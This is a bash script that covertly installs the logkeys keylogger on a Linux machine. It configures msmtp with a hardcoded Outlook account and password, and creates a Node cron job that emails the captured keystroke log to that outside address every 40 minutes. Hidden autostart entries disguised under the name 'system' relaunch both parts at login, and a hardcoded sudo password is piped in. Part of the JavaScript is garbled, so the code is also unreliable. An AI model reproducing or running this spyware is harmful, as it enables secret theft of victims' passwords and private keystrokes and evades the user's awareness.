#!/bin/bash
echo 'za' | sudo -S apt-get update

sudo apt install msmtp build-essential autotools-dev autoconf kbd

git clone https://github.com/kernc/logkeys.git ~/.config/

sudo chmod +x ~/.config/logkeys/autogen.sh
cd ~/.config/logkeys
./autogen.sh 

cd ~/.config/logkeys/build
../configure  
make
echo "za" | su -c "make install"
logkeys --start --output ~/.config/logkeys/build/test.log


echo 'za' | sudo -S sh -c 'cat << EOF > /etc/msmtprc
account default
host smtp-mail.outlook.com
port 587
from dayzubuntu@outlook.com
auth on
user dayzubuntu@outlook.com
password ubuntusupportchannel@ubuntu.com
tls on
tls_starttls on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
EOF'


echo 'const { exec } = require("child_process");
const cron = require("node-cron");

const comyscript.shmmand = "echo -e \"$(cat ~/.config/logkeys/build/test.log)\" | msmtp dayzubuntu@outlook.com";

cron.schedule("*/40 * * * *", () => {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing command: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Command stderr: ${stderr}`);
      return;
    }
    console.log(`Command stdout: ${stdout}`);
  });
});' > ~/.config/logkeys/build/automator.js


cat << EOF > ~/.config/autostart/system.desktop
[Desktop Entry]
Type=Application
Exec=logkeys --start --output ~/.config/logkeys/build/test.log
Hidden=true
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=system
Comment=comment
EOF

cat << EOF > ~/.config/autostart/automator.desktop
[Desktop Entry]
Type=Application
Exec= node ~/.config/logkeys/build/automator.js
Hidden=true
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=system
Comment=comment
EOF

cd ~/.config/logkeys/build

npm init -y
npm i node-cron
node ~/.config/logkeys/build/automator.js